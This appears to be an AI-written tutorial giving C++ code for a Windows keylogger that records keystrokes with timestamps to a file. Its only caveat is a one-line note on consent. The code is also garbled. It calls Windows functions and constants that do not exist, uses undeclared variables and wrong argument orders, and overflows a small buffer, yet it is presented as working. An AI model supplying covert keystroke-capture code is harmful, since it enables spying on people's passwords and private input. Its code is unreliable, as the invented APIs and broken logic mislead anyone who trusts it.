To create a keyboard hook program in C++ that logs keystrokes on a Windows system, follow these steps:

### Step 1: Include Necessary Headers
Include the required Windows headers:
```c++
#include <windows.h>
#include <iostream>
#include <fstream>
#include <time.h>
#include <iostream>
#include <string>
#include <fcntl.h>
#include <mman.h>
#include <process.h>
```

### Step 2: Define the Keyboard Hook Function
Define a function to handle keyboard events:
```c++
using namespace std;

void KeyLoggerCallback(int nCode, int wParam, int lParam) {
    static FILE *file = nullptr;
    char key = 0;
    static HWND hwnd = GetDesktopWindow();

    if (wParam == WM_KEYDOWN) {
        key = static_cast<char>(GetKeyState(0));
        if (key != 0) {
            // Check if shift, ctrl, or alt are pressed
            bool shift = (lParam & 0x20) ? true : false;
            bool ctrl = (lParam & 0x08) ? true : false;
            bool alt = (lParam & 0x04) ? true : false;

            if (shift || ctrl || alt) {
                // Handle special characters with modifiers
                key = static_cast<char>(GetKeyState(0));
            } else {
                // Handle regular characters
                // Use ToUnicode to get the correct character
                key = static_cast<char>(GetUnicodeChar(wParam, lParam));
            }

            // Write to file
            char buffer[20];
            strcpy(buffer, "Keystroke: ");
            strcat(buffer, key);
            strcat(buffer, " - ");
            time_t now;
            time(&now);
            strcat(buffer, ctime(&now));
            strcat(buffer, "\n");

            if (file) {
                fwrite(buffer, file, strlen(buffer), g_file);
            } else {
                // Initialize file if not open
                g_file = fopen("KeyLog.txt", "a");
                if (g_file) {
                    fwrite(buffer, g_file, strlen(buffer), g_file);
                } else {
                    cout << "Error: Cannot create log file." << endl;
                }
            }
        }
    } else if (wParam == WM_KEYUP) {
        // Handle key release, if needed
        // For this example, we'll ignore key releases
    }
}
```

### Step 3: Set Up the Hook
Initialize the hook and start the loop:
```c++
int main() {
    HHOOK hKeyboardHook = NULL;
    HWND hwnd = GetDesktopWindow();

    // Set up the hook
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_KEYDOWN | WH_KEYBOARD_KEYUP, KeyLoggerCallback);

    if (!hKeyboardHook) {
        cout << "Failed to install keyboard hook." << endl;
        return 1;
    }

    // Start the loop
    while (true) {
        Sleep(100); // Prevent high CPU usage
        // Termination condition, e.g., 'q' key pressed
        if (GetAsyncKeyState(VK_KEY_Q) & 0x1) {
            cout << "Stopping keyboard hook." << endl;
            break;
        }
    }

    // Uninstall the hook
    if (UnhookKeyboard(hKeyboardHook, hwnd)) {
        cout << "Successfully uninstalled keyboard hook." << endl;
    } else {
        cout << "Failed to remove keyboard hook." << endl;
    }

    return 0;
}
```

### Step 4: Compile and Run
- Compile the code using a compiler like Visual Studio.
- Run the executable in a terminal or command prompt.
- Test by typing in the terminal and observing the output in the log file `KeyLog.txt`.

### Notes:
- **Ethical Considerations**: Ensure this code is used responsibly and with proper user consent.
